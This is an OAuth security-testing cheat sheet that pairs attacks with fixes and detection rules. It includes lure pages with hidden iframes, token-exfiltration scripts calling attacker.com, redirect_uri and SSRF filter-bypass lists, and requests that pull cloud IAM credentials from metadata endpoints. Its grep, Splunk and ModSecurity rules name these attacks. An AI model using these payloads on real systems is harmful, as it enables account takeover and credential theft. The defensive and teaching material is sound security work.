# OAuth Authentication - Complete Cheat Sheet

## Quick Navigation
- [Common Vulnerabilities](#common-vulnerabilities)
- [Testing Methodology](#testing-methodology)
- [Exploitation Payloads](#exploitation-payloads)
- [Burp Suite Commands](#burp-suite-commands)
- [HTTP Requests Library](#http-requests-library)
- [Bypass Techniques](#bypass-techniques)
- [Detection Signatures](#detection-signatures)
- [Prevention Controls](#prevention-controls)

---

## Common Vulnerabilities

### 1. Missing state Parameter (CSRF)

**Risk**: Critical - Account takeover via CSRF

**Identification**:
```http
GET /auth?client_id=abc&redirect_uri=https://app.com/callback&response_type=code
# Missing &state= parameter
```

**Exploitation**:
```html
<!-- Capture authorization code -->
<iframe src="https://app.com/oauth-linking?code=STOLEN_CODE"></iframe>
```

**Fix**:
```python
# Generate random state
import secrets
state = secrets.token_urlsafe(32)
session['oauth_state'] = state

# Validate state
if request.args['state'] != session.pop('oauth_state'):
    abort(403)
```

---

### 2. Weak redirect_uri Validation

**Risk**: Critical - Authorization code/token theft

**Test Cases**:

```http
# Test 1: Complete bypass
redirect_uri=https://attacker.com

# Test 2: Prefix matching bypass
redirect_uri=https://victim.com.attacker.com
redirect_uri=https://victim.com@attacker.com
redirect_uri=https://victim.com%2eattacker.com

# Test 3: Directory traversal
redirect_uri=https://victim.com/oauth-callback/../
redirect_uri=https://victim.com/oauth-callback/../evil
redirect_uri=https://victim.com/oauth-callback/..%2fevil
redirect_uri=https://victim.com/oauth-callback/..;/evil

# Test 4: Subdomain
redirect_uri=https://evil.victim.com
redirect_uri=https://victim.evil.com

# Test 5: Parameter pollution
redirect_uri=https://victim.com&redirect_uri=https://attacker.com
redirect_uri=https://victim.com%26redirect_uri=https://attacker.com

# Test 6: Fragment injection
redirect_uri=https://victim.com/callback%23@attacker.com

# Test 7: Path confusion
redirect_uri=https://victim.com//attacker.com
redirect_uri=https://victim.com\attacker.com

# Test 8: URL encoding bypass
redirect_uri=https://victim.com/%2f/attacker.com
redirect_uri=https://victim.com%2f%2fattacker.com
```

**Fix**:
```python
# Exact match only
ALLOWED_REDIRECTS = [
    'https://app.com/oauth-callback',
    'https://app.com/oauth-callback/',
]

from urllib.parse import urlparse

def validate_redirect_uri(uri):
    # Normalize URI
    parsed = urlparse(uri)
    normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # Exact match only
    return normalized in ALLOWED_REDIRECTS
```

---

### 3. Implicit Flow Token Leakage

**Risk**: High - Access tokens exposed in URLs

**Vulnerable Pattern**:
```
# Tokens in URL fragments
https://app.com/callback#access_token=TOKEN&expires_in=3600
```

**Attack Vectors**:
- Browser history
- Referer headers
- Server logs (if fragment sent)
- postMessage leaks
- Open redirects

**Exploitation**:
```html
<!-- Steal token via postMessage -->
<iframe src="OAUTH_URL_WITH_TOKEN_RESPONSE"></iframe>
<script>
window.addEventListener('message', function(e) {
    if (e.data.type === 'oauth_callback') {
        fetch('https://attacker.com/?token=' + e.data.token);
    }
});
</script>
```

**Fix**: Use authorization code flow with PKCE instead

---

### 4. Client-Side Validation Bypass

**Risk**: Critical - Authentication bypass

**Vulnerable Pattern**:
```javascript
// Client validates token, sends user data
POST /authenticate
{
  "email": "user@example.com",
  "token": "access_token_here"
}
```

**Exploitation**:
```http
# Modify email while keeping same token
POST /authenticate HTTP/1.1
Content-Type: application/json

{"email":"admin@example.com","token":"legitimate_user_token"}
```

**Fix**:
```python
# Server-side validation
def authenticate(email, token):
    # Validate token with OAuth provider
    response = requests.get(
        'https://oauth.com/userinfo',
        headers={'Authorization': f'Bearer {token}'}
    )

    if response.status_code != 200:
        raise Unauthorized()

    user_info = response.json()

    # Verify email matches token
    if user_info['email'] != email:
        raise Forbidden('Email mismatch')

    return user_info
```

---

### 5. Scope Escalation

**Risk**: High - Unauthorized privilege escalation

**Test**:
```http
# Request minimal scope
GET /auth?scope=profile

# Modify token request to escalate
POST /token
scope=admin+delete_users+read_secrets
```

**Fix**:
```python
# Validate scope at every step
def validate_token_scope(token, required_scope):
    token_scopes = get_token_scopes(token)
    if required_scope not in token_scopes:
        raise Forbidden('Insufficient scope')
```

---

### 6. SSRF via Client Registration

**Risk**: Critical - Internal network access, cloud metadata theft

**Vulnerable Endpoints**:
```http
POST /reg
{
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
  "jwks_uri": "http://internal-server/admin",
  "sector_identifier_uri": "http://localhost:8080/config"
}
```

**SSRF Targets**:

**AWS Metadata:**
```bash
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/
http://169.254.169.254/latest/user-data
http://169.254.169.254/latest/dynamic/instance-identity/document
```

**Azure Metadata:**
```bash
http://metadata.azure.com/metadata/instance?api-version=2021-02-01
http://metadata.azure.com/metadata/identity/oauth2/token?api-version=2021-02-01&resource=https://management.azure.com/
```

**Google Cloud:**
```bash
http://metadata.google.internal/computeMetadata/v1/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://metadata.google.internal/computeMetadata/v1/project/project-id
```

**Internal Networks:**
```bash
http://localhost:8080/admin
http://127.0.0.1:6379/  # Redis
http://192.168.1.1/config
http://10.0.0.1:9200/  # Elasticsearch
```

**Fix**:
```python
import ipaddress

BLOCKED_RANGES = [
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('169.254.0.0/16'),  # AWS metadata
]

def validate_uri(uri):
    parsed = urlparse(uri)
    ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))

    for blocked_range in BLOCKED_RANGES:
        if ip in blocked_range:
            raise SecurityError('Private IP not allowed')
```

---

## Testing Methodology

### Phase 1: Information Gathering (5 minutes)

**1. Identify OAuth Provider**
```http
# Check for OpenID configuration
GET /.well-known/openid-configuration HTTP/1.1

# Check for OAuth metadata
GET /.well-known/oauth-authorization-server HTTP/1.1
```

**2. Map OAuth Flow**
- Complete login via OAuth
- Capture all requests in Burp
- Document endpoints:
  - Authorization: `/auth`, `/authorize`
  - Token: `/token`
  - User info: `/userinfo`, `/me`
  - Client registration: `/reg`, `/register`

**3. Identify Flow Type**
```
response_type=code → Authorization Code Flow
response_type=token → Implicit Flow (insecure)
response_type=id_token → OpenID Connect
```

**4. Extract Parameters**
```
client_id: Application identifier
redirect_uri: Callback URL
scope: Permissions requested
state: CSRF token
nonce: Replay protection
code_challenge: PKCE challenge
```

---

### Phase 2: Vulnerability Testing (15 minutes)

**1. Test state Parameter (2 minutes)**
```bash
# Check if state exists
grep "state=" authorization_request.txt

# Test if validated
# Send callback with different state value
# If accepted → CSRF vulnerability
```

**2. Test redirect_uri Validation (5 minutes)**
```bash
# Run all tests from "Weak redirect_uri Validation" section
# Document which bypasses work
# Try chaining with open redirects
```

**3. Test Scope Handling (2 minutes)**
```bash
# Request minimal scope
scope=profile

# Modify to admin scope in token request
scope=admin

# Check if escalation succeeds
```

**4. Test Token Validation (3 minutes)**
```bash
# Capture authentication request
# Modify user parameters (email, username, user_id)
# Keep original token
# Check if application validates token-parameter binding
```

**5. Test Client Registration (3 minutes)**
```bash
# Check if enabled
POST /reg

# Test SSRF
POST /reg
{"logo_uri": "http://169.254.169.254/latest/meta-data/"}

# Request logo
GET /client/CLIENT_ID/logo
```

---

### Phase 3: Exploitation (10 minutes)

**Based on findings, execute appropriate attack:**
- CSRF → Force account linking
- redirect_uri bypass → Steal authorization codes
- Token leakage → Capture access tokens
- Client validation → Parameter manipulation
- SSRF → Cloud metadata theft

---

## Exploitation Payloads

### CSRF Account Linking Exploit

```html
<!DOCTYPE html>
<html>
<head>
    <title>Special Offer</title>
</head>
<body>
<h1>Loading your exclusive offer...</h1>

<!-- Hidden iframe triggers OAuth linking -->
<iframe
    src="https://victim.com/oauth-linking?code=ATTACKER_AUTHORIZATION_CODE"
    style="display:none;">
</iframe>

<script>
// Optional: Redirect after delay
setTimeout(function() {
    window.location = 'https://victim.com/login';
}, 3000);
</script>
</body>
</html>
```

---

### Authorization Code Theft Exploit

```html
<!DOCTYPE html>
<html>
<head>
    <title>Prize Notification</title>
</head>
<body>
<h1>Verifying your prize...</h1>

<!-- Iframe with malicious redirect_uri -->
<iframe
    src="https://oauth-server.com/auth?client_id=CLIENT_ID&redirect_uri=https://attacker.com/callback&response_type=code&scope=openid%20profile%20email"
    style="width:0;height:0;border:0;">
</iframe>

<!-- Access logs will capture: GET /callback?code=VICTIM_CODE -->
</body>
</html>
```

---

### Access Token Theft via postMessage

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<h1>Please wait...</h1>

<!-- Iframe triggers OAuth with directory traversal -->
<iframe
    id="oauth-frame"
    src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/oauth-callback/../post/comment/comment-form&response_type=token&nonce=123&scope=openid%20profile%20email">
</iframe>

<script>
// Listen for postMessage from comment form
window.addEventListener('message', function(e) {
    // Comment form sends window.location.href with token in fragment
    console.log('Received message:', e.data);

    // Exfiltrate to attacker server
    fetch('https://attacker.com/collect?data=' + encodeURIComponent(JSON.stringify(e.data)));
}, false);
</script>
</body>
</html>
```

---

### Access Token Theft via Open Redirect

```html
<!DOCTYPE html>
<html>
<head>
    <title>Loading...</title>
</head>
<body>
<h1>Processing...</h1>

<!-- Main exploit page with iframe -->
<iframe
    src="https://oauth-server.com/auth?client_id=ID&redirect_uri=https://victim.com/oauth-callback/../post/next?path=https://attacker.com/extract&response_type=token&nonce=456&scope=openid%20profile%20email">
</iframe>
</body>
</html>
```

**Token Extractor Page (at /extract):**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Extract</title>
</head>
<body>
<h1>Verifying...</h1>

<script>
// Read token from URL fragment
if (window.location.hash) {
    // Extract fragment data
    var fragment = window.location.hash.substring(1);

    // Parse parameters
    var params = new URLSearchParams(fragment);
    var token = params.get('access_token');

    // Send to collection endpoint
    if (token) {
        fetch('/collect?token=' + encodeURIComponent(token));
    }

    // Alternative: Redirect entire fragment
    window.location = '/collect?' + fragment;
}
</script>
</body>
</html>
```

---

### SSRF Cloud Metadata Extraction

```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "redirect_uris": ["https://example.com"],
  "logo_uri": "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin/"
}

# Response contains client_id
# Request logo to trigger SSRF
GET /client/RETURNED_CLIENT_ID/logo HTTP/1.1

# Response contains AWS credentials:
{
  "Code": "Success",
  "AccessKeyId": "ASIA...",
  "SecretAccessKey": "SECRET_KEY",
  "Token": "TOKEN_VALUE"
}
```

---

### Parameter Manipulation Exploit

```http
# Capture normal authentication request
POST /authenticate HTTP/1.1
Host: victim.com
Content-Type: application/json

{
  "email": "attacker@example.com",
  "username": "attacker",
  "token": "attacker_access_token"
}

# Modify to impersonate victim
POST /authenticate HTTP/1.1
Host: victim.com
Content-Type: application/json

{
  "email": "admin@victim.com",
  "username": "admin",
  "user_id": "1",
  "role": "administrator",
  "token": "attacker_access_token"
}

# Use Burp Repeater "Request in browser" to create session
```

---

## Burp Suite Commands

### Proxy Configuration

```
# Start Burp Suite
java -jar burpsuite.jar

# Configure browser proxy
Settings → Network → Manual proxy → 127.0.0.1:8080

# Import CA certificate
http://burp → CA Certificate → Install in browser
```

### Essential Shortcuts

```
Ctrl/Cmd + R        Send to Repeater
Ctrl/Cmd + I        Send to Intruder
Ctrl/Cmd + Shift + B Send to Burp Collaborator
Ctrl/Cmd + Space    Forward intercepted request
Ctrl/Cmd + Z        Drop intercepted request
Ctrl/Cmd + F        Find in request/response
```

### Repeater Workflows

**Test redirect_uri Validation:**
```
1. Find authorization request in HTTP history
2. Right-click → Send to Repeater
3. Modify redirect_uri parameter
4. Send request
5. Analyze Location header in response
6. Document accepted formats
```

**Test Token with User Info:**
```
1. Find /userinfo or /me request
2. Send to Repeater
3. Modify Authorization header with stolen token
4. Send request
5. Extract user information from response
```

**Test State Validation:**
```
1. Find callback request: /callback?code=...&state=...
2. Send to Repeater
3. Modify state parameter to random value
4. Send request
5. Check if application accepts different state
```

### Intruder Payloads

**Fuzz redirect_uri:**
```
Positions:
  redirect_uri=§https://victim.com/callback§

Payloads:
  https://attacker.com
  https://victim.com.attacker.com
  https://victim.com@attacker.com
  https://victim.com/callback/../
  https://victim.com/callback/../evil
  https://victim.com%2fattacker.com
```

**Test Cloud Metadata Paths:**
```
Positions:
  logo_uri=http://169.254.169.254/§latest/meta-data§

Payloads:
  latest/meta-data/
  latest/meta-data/iam/
  latest/meta-data/iam/security-credentials/
  latest/meta-data/iam/security-credentials/admin/
  latest/meta-data/iam/security-credentials/ec2-role/
  latest/user-data
  latest/dynamic/instance-identity/document
```

### Collaborator Usage

**Test SSRF in Client Registration:**
```
1. Burp → Burp Collaborator client
2. Copy collaborator subdomain
3. Register client with:
   {
     "logo_uri": "https://abc123.burpcollaborator.net/test.png"
   }
4. Request logo endpoint
5. Check Collaborator for HTTP request
6. Confirms SSRF vulnerability
```

### Match and Replace Rules

**Add CORS Headers for Testing:**
```
Proxy → Options → Match and Replace → Add

Type: Response header
Match: ^$
Replace: Access-Control-Allow-Origin: *
```

**Modify redirect_uri Automatically:**
```
Type: Request header
Match: redirect_uri=https://victim\.com/callback
Replace: redirect_uri=https://attacker.com/callback
```

---

## HTTP Requests Library

### Authorization Request

```http
GET /auth?client_id=CLIENT_ID&redirect_uri=https://app.com/callback&response_type=code&scope=openid%20profile%20email&state=RANDOM_STATE&nonce=RANDOM_NONCE HTTP/1.1
Host: oauth-server.com
```

**Parameters:**
- `client_id`: Application identifier (required)
- `redirect_uri`: Callback URL (required)
- `response_type`: `code`, `token`, or `id_token` (required)
- `scope`: Requested permissions (required)
- `state`: CSRF protection token (recommended)
- `nonce`: Replay protection (recommended for implicit flow)
- `code_challenge`: PKCE challenge (recommended for public clients)
- `code_challenge_method`: `S256` or `plain`

---

### Authorization Response

**Authorization Code Flow:**
```http
HTTP/1.1 302 Found
Location: https://app.com/callback?code=AUTHORIZATION_CODE&state=SAME_STATE
```

**Implicit Flow:**
```http
HTTP/1.1 302 Found
Location: https://app.com/callback#access_token=ACCESS_TOKEN&token_type=Bearer&expires_in=3600&scope=openid%20profile%20email&state=SAME_STATE
```

---

### Token Exchange (Code Flow)

```http
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=https://app.com/callback&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

**With PKCE:**
```http
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=authorization_code&code=AUTHORIZATION_CODE&redirect_uri=https://app.com/callback&client_id=CLIENT_ID&code_verifier=CODE_VERIFIER
```

**Response:**
```json
{
  "access_token": "ACCESS_TOKEN_HERE",
  "token_type": "Bearer",
  "expires_in": 3600,
  "refresh_token": "REFRESH_TOKEN_HERE",
  "scope": "openid profile email"
}
```

---

### User Info Request

```http
GET /userinfo HTTP/1.1
Host: oauth-server.com
Authorization: Bearer ACCESS_TOKEN
```

**Alternative:**
```http
GET /me HTTP/1.1
Host: oauth-server.com
Authorization: Bearer ACCESS_TOKEN
```

**Response:**
```json
{
  "sub": "123456789",
  "name": "John Doe",
  "email": "john@example.com",
  "email_verified": true,
  "picture": "https://example.com/profile.jpg"
}
```

---

### Client Registration (OpenID Dynamic)

```http
POST /reg HTTP/1.1
Host: oauth-server.com
Content-Type: application/json

{
  "redirect_uris": ["https://app.com/callback"],
  "token_endpoint_auth_method": "client_secret_basic",
  "grant_types": ["authorization_code"],
  "response_types": ["code"],
  "client_name": "My Application",
  "logo_uri": "https://app.com/logo.png",
  "jwks_uri": "https://app.com/jwks.json"
}
```

**Response:**
```json
{
  "client_id": "GENERATED_CLIENT_ID",
  "client_secret": "GENERATED_CLIENT_SECRET",
  "client_id_issued_at": 1640000000,
  "client_secret_expires_at": 0,
  "redirect_uris": ["https://app.com/callback"],
  "token_endpoint_auth_method": "client_secret_basic",
  "grant_types": ["authorization_code"],
  "response_types": ["code"]
}
```

---

### Token Refresh

```http
POST /token HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

grant_type=refresh_token&refresh_token=REFRESH_TOKEN&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

---

### Token Revocation

```http
POST /revoke HTTP/1.1
Host: oauth-server.com
Content-Type: application/x-www-form-urlencoded

token=ACCESS_TOKEN&token_type_hint=access_token&client_id=CLIENT_ID&client_secret=CLIENT_SECRET
```

---

## Bypass Techniques

### redirect_uri Bypasses

**1. Prefix Matching:**
```
https://victim.com → https://victim.com.attacker.com
https://victim.com → https://victim.com@attacker.com
https://victim.com → https://victim-com.attacker.com
```

**2. Directory Traversal:**
```
https://victim.com/callback/../
https://victim.com/callback/..;/evil
https://victim.com/callback/..%2f
https://victim.com/callback/..%252f (double encoding)
https://victim.com/callback/....//
```

**3. Open Redirect Chain:**
```
https://victim.com/redirect?url=https://attacker.com
https://victim.com/goto?destination=https://attacker.com
https://victim.com/post/next?path=https://attacker.com
```

**4. Subdomain Takeover:**
```
# Find abandoned subdomain
https://abandoned.victim.com

# Register via third-party service
# Use as redirect_uri
redirect_uri=https://abandoned.victim.com
```

**5. Parameter Pollution:**
```
redirect_uri=https://victim.com&redirect_uri=https://attacker.com
redirect_uri=https://victim.com%26redirect_uri=https://attacker.com
redirect_uri=https://victim.com;redirect_uri=https://attacker.com
```

**6. Case Sensitivity:**
```
redirect_uri=https://VICTIM.COM
redirect_uri=https://Victim.Com
redirect_uri=https://victim.COM
```

**7. Port Manipulation:**
```
redirect_uri=https://victim.com:443@attacker.com
redirect_uri=https://victim.com:8080/callback
```

**8. Path Confusion:**
```
redirect_uri=https://victim.com//attacker.com
redirect_uri=https://victim.com\attacker.com
redirect_uri=https://victim.com/.attacker.com
```

---

### State Validation Bypasses

**1. Omit State:**
```
# If not required, simply remove
/auth?client_id=...&redirect_uri=...&response_type=code
```

**2. Static State:**
```
# Test if state is predictable
state=12345
state=abc123
state=default
```

**3. State Not Bound to Session:**
```
# Use state from different user's session
# Capture state from User A
# Use in attack against User B
```

**4. Race Condition:**
```
# Send multiple parallel requests
# State validation may fail under concurrency
```

---

### SSRF Filter Bypasses

**1. Alternative IP Representations:**
```
# AWS Metadata (169.254.169.254)
http://169.254.169.254/           # Decimal
http://0xA9FEA9FE/                # Hex
http://2852039166/                # Integer
http://[::ffff:169.254.169.254]/  # IPv6
http://169.254.169.254.xip.io/    # DNS
http://[fd00::169:254:169:254]/   # IPv6 private
http://169.254.0169.254/          # Octal
http://0251.0376.0251.0376/       # Octal
```

**2. DNS Rebinding:**
```
# Point domain to internal IP
attacker.com → 169.254.169.254
```

**3. Protocol Smuggling:**
```
gopher://internal-server:6379/_SET%20key%20value
dict://internal-server:11211/STATS
ldap://internal-server:389/
sftp://internal-server:22/
```

**4. Redirects:**
```
# Redirect from allowed domain to blocked IP
logo_uri=https://allowed.com/redirect → 169.254.169.254
```

**5. DNS Rebinding Attack:**
```
1. Register domain: evil.com
2. Set short TTL (1 second)
3. Initially resolve to: 1.2.3.4 (allowed)
4. After validation, rebind to: 169.254.169.254
```

---

### Token Extraction Bypasses

**1. XSS to Extract Token:**
```javascript
// If XSS exists on redirect_uri domain
<script>
var token = window.location.hash.match(/access_token=([^&]*)/)[1];
fetch('https://attacker.com/?token=' + token);
</script>
```

**2. Service Worker:**
```javascript
// Register service worker to intercept requests
navigator.serviceWorker.register('/sw.js');

// sw.js - Intercept OAuth callbacks
self.addEventListener('fetch', function(event) {
    if (event.request.url.includes('oauth-callback')) {
        // Extract and exfiltrate token
    }
});
```

**3. Browser Extension:**
```javascript
// Malicious extension monitors URL changes
chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
    if (changeInfo.url && changeInfo.url.includes('access_token=')) {
        // Extract token
    }
});
```

---

## Detection Signatures

### Log Analysis Patterns

**Suspicious redirect_uri:**
```bash
# Look for external domains
grep -E "redirect_uri=https?://[^/]*(?<!victim\.com)" oauth.log

# Look for directory traversal
grep -E "redirect_uri=[^&]*\.\.\/" oauth.log

# Look for uncommon ports
grep -E "redirect_uri=[^:]*:[0-9]{2,5}" oauth.log
```

**Missing state Parameter:**
```bash
# Authorization requests without state
grep "/auth?" oauth.log | grep -v "state="
```

**SSRF Attempts:**
```bash
# Client registration with private IPs
grep "logo_uri.*192\.168\." registration.log
grep "logo_uri.*127\.0\.0\.1" registration.log
grep "logo_uri.*169\.254\.169\.254" registration.log
grep "logo_uri.*localhost" registration.log
```

**Rapid Code Exchange:**
```bash
# Multiple token requests with same code (replay)
awk '{print $NF}' token.log | sort | uniq -d
```

---

### SIEM Rules

**Splunk:**
```
# Detect SSRF in client registration
index=oauth sourcetype=registration logo_uri=*169.254.169.254*

# Detect missing state parameter
index=oauth sourcetype=authorization NOT state=*

# Detect redirect_uri anomalies
index=oauth sourcetype=authorization redirect_uri!="https://known-app.com/*"

# Detect rapid token exchange (replay attack)
index=oauth sourcetype=token | stats count by code | where count > 1
```

**ELK Stack:**
```json
{
  "query": {
    "bool": {
      "must": [
        {"match": {"event.type": "oauth_authorization"}},
        {"bool": {"must_not": {"exists": {"field": "state"}}}}
      ]
    }
  }
}
```

---

### Web Application Firewall Rules

**ModSecurity:**
```apache
# Block private IPs in logo_uri
SecRule ARGS:logo_uri "@rx (?:192\.168\.|10\.|172\.(?:1[6-9]|2[0-9]|3[01])\.|127\.|169\.254\.)" \
    "id:1001,phase:2,deny,status:403,msg:'SSRF attempt detected'"

# Block directory traversal in redirect_uri
SecRule ARGS:redirect_uri "@rx \.\.\/" \
    "id:1002,phase:2,deny,status:403,msg:'Directory traversal in redirect_uri'"

# Enforce state parameter
SecRule REQUEST_URI "@rx /auth\?" \
    "chain,id:1003,phase:2,deny,status:403,msg:'Missing state parameter'"
SecRule ARGS:!state "@rx ."
```

---

## Prevention Controls

### Server-Side Implementation

**Strict redirect_uri Validation:**
```python
from urllib.parse import urlparse

ALLOWED_REDIRECTS = {
    'https://app.com/oauth-callback',
    'https://app.com/oauth-callback/',
}

def validate_redirect_uri(uri):
    # Parse and normalize
    parsed = urlparse(uri)

    # Reconstruct without query/fragment
    normalized = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"

    # Remove trailing slash for comparison
    normalized = normalized.rstrip('/')

    # Exact match only
    if normalized not in [r.rstrip('/') for r in ALLOWED_REDIRECTS]:
        raise ValueError('Invalid redirect_uri')

    return normalized
```

**State Parameter Implementation:**
```python
import secrets
import hmac
import hashlib

def generate_state(session_id):
    # Generate random state
    random_part = secrets.token_urlsafe(32)

    # Create HMAC to bind to session
    mac = hmac.new(
        SECRET_KEY.encode(),
        f"{session_id}:{random_part}".encode(),
        hashlib.sha256
    ).hexdigest()

    # Format: random_part:mac
    return f"{random_part}:{mac}"

def validate_state(state, session_id):
    try:
        random_part, received_mac = state.split(':', 1)
    except ValueError:
        return False

    # Recompute MAC
    expected_mac = hmac.new(
        SECRET_KEY.encode(),
        f"{session_id}:{random_part}".encode(),
        hashlib.sha256
    ).hexdigest()

    # Constant-time comparison
    return hmac.compare_digest(received_mac, expected_mac)
```

**PKCE Implementation:**
```python
import secrets
import hashlib
import base64

def generate_pkce_pair():
    # Generate code_verifier (43-128 characters)
    code_verifier = base64.urlsafe_b64encode(
        secrets.token_bytes(32)
    ).decode('utf-8').rstrip('=')

    # Generate code_challenge (SHA256 of verifier)
    challenge_bytes = hashlib.sha256(
        code_verifier.encode('utf-8')
    ).digest()

    code_challenge = base64.urlsafe_b64encode(
        challenge_bytes
    ).decode('utf-8').rstrip('=')

    return code_verifier, code_challenge

# Authorization request
def authorize(client_id, redirect_uri, scope):
    verifier, challenge = generate_pkce_pair()

    # Store verifier in session
    session['code_verifier'] = verifier

    # Include challenge in authorization URL
    auth_url = (
        f"https://oauth-server.com/auth?"
        f"client_id={client_id}&"
        f"redirect_uri={redirect_uri}&"
        f"response_type=code&"
        f"scope={scope}&"
        f"code_challenge={challenge}&"
        f"code_challenge_method=S256"
    )

    return redirect(auth_url)

# Token exchange
def exchange_code(code, client_id, redirect_uri):
    verifier = session.pop('code_verifier')

    response = requests.post(
        'https://oauth-server.com/token',
        data={
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': redirect_uri,
            'client_id': client_id,
            'code_verifier': verifier,
        }
    )

    return response.json()
```

**SSRF Prevention:**
```python
import socket
import ipaddress

BLOCKED_NETWORKS = [
    ipaddress.ip_network('127.0.0.0/8'),      # Localhost
    ipaddress.ip_network('10.0.0.0/8'),       # Private
    ipaddress.ip_network('172.16.0.0/12'),    # Private
    ipaddress.ip_network('192.168.0.0/16'),   # Private
    ipaddress.ip_network('169.254.0.0/16'),   # Link-local/AWS metadata
    ipaddress.ip_network('::1/128'),          # IPv6 localhost
    ipaddress.ip_network('fc00::/7'),         # IPv6 private
    ipaddress.ip_network('fe80::/10'),        # IPv6 link-local
]

ALLOWED_SCHEMES = ['https']

def validate_external_url(url):
    parsed = urlparse(url)

    # Check scheme
    if parsed.scheme not in ALLOWED_SCHEMES:
        raise SecurityError(f'Scheme {parsed.scheme} not allowed')

    # Resolve hostname
    try:
        ip = ipaddress.ip_address(socket.gethostbyname(parsed.hostname))
    except (socket.gaierror, ValueError):
        raise SecurityError('Invalid hostname')

    # Check against blocked networks
    for blocked_network in BLOCKED_NETWORKS:
        if ip in blocked_network:
            raise SecurityError(f'IP {ip} is blocked')

    return url

def fetch_logo(logo_uri):
    # Validate URL
    validated_uri = validate_external_url(logo_uri)

    # Fetch with restrictions
    response = requests.get(
        validated_uri,
        timeout=5,
        allow_redirects=False,
        headers={'User-Agent': 'OAuth-Server/1.0'}
    )

    # Validate content type
    content_type = response.headers.get('Content-Type', '')
    if not content_type.startswith('image/'):
        raise SecurityError('Invalid content type')

    # Limit size
    if len(response.content) > 5 * 1024 * 1024:  # 5MB
        raise SecurityError('Image too large')

    return response.content
```

**Token Validation:**
```python
import requests

def validate_token_and_get_user(token):
    # Query OAuth provider's userinfo endpoint
    response = requests.get(
        'https://oauth-server.com/userinfo',
        headers={'Authorization': f'Bearer {token}'},
        timeout=5
    )

    if response.status_code != 200:
        raise Unauthorized('Invalid token')

    user_info = response.json()

    # Validate required fields
    required_fields = ['sub', 'email', 'email_verified']
    for field in required_fields:
        if field not in user_info:
            raise ValueError(f'Missing required field: {field}')

    # Check email verification
    if not user_info.get('email_verified'):
        raise ValueError('Email not verified')

    return user_info

def authenticate(email, token):
    # Validate token with OAuth provider
    user_info = validate_token_and_get_user(token)

    # Verify email matches token
    if user_info['email'] != email:
        raise Forbidden('Email mismatch')

    # Create or update user session
    user = get_or_create_user(user_info['sub'], user_info['email'])
    session['user_id'] = user.id

    return user
```

---

### Client-Side Best Practices

**Use Authorization Code Flow:**
```javascript
// ✅ Good - Authorization code flow
window.location = (
    'https://oauth-server.com/auth?' +
    'response_type=code&' +  // Request code, not token
    'client_id=CLIENT_ID&' +
    'redirect_uri=https://app.com/callback&' +
    'scope=openid profile email&' +
    'state=' + generateRandomState()
);

// ❌ Bad - Implicit flow
window.location = (
    'https://oauth-server.com/auth?' +
    'response_type=token&' +  // Token in URL
    'client_id=CLIENT_ID&' +
    'redirect_uri=https://app.com/callback'
);
```

**Implement PKCE:**
```javascript
// Generate PKCE pair
async function generatePKCE() {
    // Generate random code_verifier
    const array = new Uint8Array(32);
    crypto.getRandomValues(array);
    const codeVerifier = base64URLEncode(array);

    // Generate code_challenge (SHA256 of verifier)
    const encoder = new TextEncoder();
    const data = encoder.encode(codeVerifier);
    const hash = await crypto.subtle.digest('SHA-256', data);
    const codeChallenge = base64URLEncode(new Uint8Array(hash));

    return { codeVerifier, codeChallenge };
}

// Store verifier, send challenge
const { codeVerifier, codeChallenge } = await generatePKCE();
sessionStorage.setItem('pkce_verifier', codeVerifier);

window.location = (
    'https://oauth-server.com/auth?' +
    'response_type=code&' +
    'code_challenge=' + codeChallenge +
    '&code_challenge_method=S256&' +
    'client_id=CLIENT_ID&' +
    'redirect_uri=https://app.com/callback'
);

// On callback, exchange code with verifier
const code = new URLSearchParams(window.location.search).get('code');
const verifier = sessionStorage.getItem('pkce_verifier');

fetch('https://app.com/token', {
    method: 'POST',
    body: JSON.stringify({
        code: code,
        code_verifier: verifier
    })
});
```

---

## Tools and Resources

### Testing Tools

- **Burp Suite Pro**: https://portswigger.net/burp
- **OWASP ZAP**: https://www.zaproxy.org/
- **OAuth.tools**: https://oauth.tools/
- **JWT.io**: https://jwt.io/
- **OAuth Debugger**: https://oauthdebugger.com/

### Standards and Documentation

- **OAuth 2.0 RFC 6749**: https://tools.ietf.org/html/rfc6749
- **OAuth 2.1 Draft**: https://oauth.net/2.1/
- **PKCE RFC 7636**: https://tools.ietf.org/html/rfc7636
- **OpenID Connect**: https://openid.net/connect/
- **OWASP OAuth Cheat Sheet**: https://cheatsheetseries.owasp.org/cheatsheets/OAuth2_Cheat_Sheet.html

---

## Summary

This cheat sheet provides comprehensive reference for OAuth authentication testing, including:

✅ **Common vulnerabilities** and exploitation techniques
✅ **Testing methodology** for systematic assessment
✅ **Exploitation payloads** ready to use
✅ **Burp Suite workflows** for efficient testing
✅ **HTTP request templates** for all OAuth interactions
✅ **Bypass techniques** for security controls
✅ **Detection signatures** for monitoring
✅ **Prevention controls** for secure implementation

**Key Takeaways:**
- Always test redirect_uri validation thoroughly
- Implement and validate state parameter for CSRF protection
- Use authorization code flow with PKCE instead of implicit flow
- Validate all OAuth responses server-side
- Block private IP ranges in SSRF-prone parameters
